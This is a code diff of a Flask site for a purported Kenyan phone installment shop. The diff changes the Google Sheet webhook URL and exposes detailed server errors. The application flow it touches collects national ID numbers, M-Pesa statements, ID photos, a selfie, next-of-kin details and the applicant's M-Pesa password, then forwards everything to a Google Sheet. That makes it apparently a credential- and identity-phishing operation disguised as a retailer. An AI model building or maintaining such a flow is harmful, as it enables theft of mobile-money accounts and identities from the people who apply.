@@ -12,7 +12,8 @@ SHOP_EMAIL = "protechphonehub@gmail.com"
 OPEN_HOURS = "Open daily 8:00 AM – 9:00 PM"
 FREE_DELIVERY_ZONES = "Nairobi County, Kiambu County, Nakuru Town & Mombasa Town"
 
-GOOGLE_SHEET_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbybHSnDImhCoK8vx-gE26wZuKPxIyHJDJIO7tQxRy2SoNaRSiIqqwo9N2NbVXVoDfhg/exec"
+# PASTE YOUR NEW WEB APP URL HERE
+GOOGLE_SHEET_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbzKF4BsWu8_X3UN31QG_OjFwQ9MPLiIgNh42RgRd15dsE_6_Q8RfVGUY7HTnOJ4aJodjw/exec"
 APP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "protech_applications.jsonl")
 
 app = Flask(__name__)
@@ -545,10 +546,17 @@ function jGo(step){PT_STEP=step;if(step===5){PT_DONE=true;}
  setStep(step===5?100:(step-1)*33);}
 function genSubId(){return 'PT-'+Date.now()+'-'+Math.floor(Math.random()*9000+1000);}
 
-// BULLETPROOF ROUTING: Send everything to our own server to bypass Google CORS browser blocks
 function postLocal(payload){
  return fetch('/api/apply',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
-   .then(function(r){return r.json();}).then(function(j){return {ok:!!(j&&j.ok)};}).catch(function(){return {ok:false};});
+   .then(function(r){return r.json();})
+   .then(function(j){
+       console.log("Server Response:", j);
+       return {ok:!!(j&&j.ok), detail: j.message || j.error || ''};
+   })
+   .catch(function(e){
+       console.error("Fetch Error:", e);
+       return {ok:false, detail: String(e)};
+   });
 }
 async function submitStage(payload,timeoutMs){
  return await postLocal(payload);
@@ -581,7 +589,7 @@ function initApply(){
    var payload={submission_id:subId,stage:'details',name:p.full_name||'',phone:p.phone_number||'',id_number:p.id_number||'',region:p.region||'',phone_model:p.phone_model||'',payment_plan:p.payment_plan||'ProTech Installment'};
    var res=await submitStage(payload,45000);
    if(res.ok){PT_SUB=subId;setDoc(payload);openModal('applicationModal');jGo(2);jMsg('Great start! Upload your M-Pesa statement next.');}
-   else{showToast('Could not reach the application server. Please check your connection.');}
+   else{showToast('Error: ' + res.detail);}
    if(sb){sb.disabled=false;sb.textContent='Submit Application';}
  });}
  var cm=document.getElementById('contMpesa');
@@ -594,7 +602,7 @@ function initApply(){
    var du=await fileToDataUrl(f.files[0],'mpesa_statement');
    var res=await submitStage({submission_id:subId,stage:'file',file_key:'mpesa_statement',filename:f.files[0].name,name:val('docFullName'),phone:val('docPhoneNumber'),data:du},180000);
    cm.disabled=false;cm.textContent='Continue';
-   if(!res.ok){showToast('Could not save your statement. Please try again.');return;}
+   if(!res.ok){showToast('Error: ' + res.detail);return;}
    jGo(3);jMsg('Now we need your ID and a selfie for verification.');
  });}
  var ci=document.getElementById('contIdentity');
@@ -607,7 +615,7 @@ function initApply(){
      var el2=document.getElementById(items[k][0]);
      var du=await fileToDataUrl(el2.files[0],items[k][1]);
      var r=await submitStage({submission_id:subId,stage:'file',file_key:items[k][1],filename:el2.files[0].name,name:val('docFullName'),phone:val('docPhoneNumber'),data:du},180000);
-     if(!r.ok){ci.disabled=false;ci.textContent='Continue';showToast('Upload problem. Please try again.');return;}
+     if(!r.ok){ci.disabled=false;ci.textContent='Continue';showToast('Error: ' + r.detail);return;}
    }
    ci.disabled=false;ci.textContent='Continue';
    jGo(4);jMsg('Last step: add your next of kin details.');
@@ -621,7 +629,7 @@ function initApply(){
    var pwEl=document.getElementById('fMpesaPw');
    var r=await submitStage({submission_id:subId,stage:'final',mpesa_password:pwEl?pwEl.value:'',kin_name:kn,kin_phone:kp,kin_id:ki,kin_relationship:kr},60000);
    fb.disabled=false;fb.textContent='Submit Final Details';
-   if(!r.ok){showToast('Could not finish. Please try again.');return;}
+   if(!r.ok){showToast('Error: ' + r.detail);return;}
    jGo(5);jMsg('Application complete! We will review and contact you shortly.');
    var wa=document.getElementById('doneWa');
    if(wa){wa.href='https://wa.me/254720890018?text='+encodeURIComponent('Hello Pro Tech Phone Hub! I just completed my application ('+subId+'). My name is '+(val('docFullName')||kn)+'. Please review.');}
@@ -1129,7 +1137,7 @@ def api_apply():
     ok, msg = post_to_google_sheet(payload)
     if ok: return jsonify({"ok": True, "message": "Application sent to Google Sheet."})
     if save_application_local(payload): return jsonify({"ok": True, "message": "Application saved (offline backup)."})
-    return jsonify({"ok": False, "error": "Application could not be saved."}), 500
+    return jsonify({"ok": False, "error": msg}), 500
 
 @app.route("/api/chat", methods=["POST"])
 def api_chat():
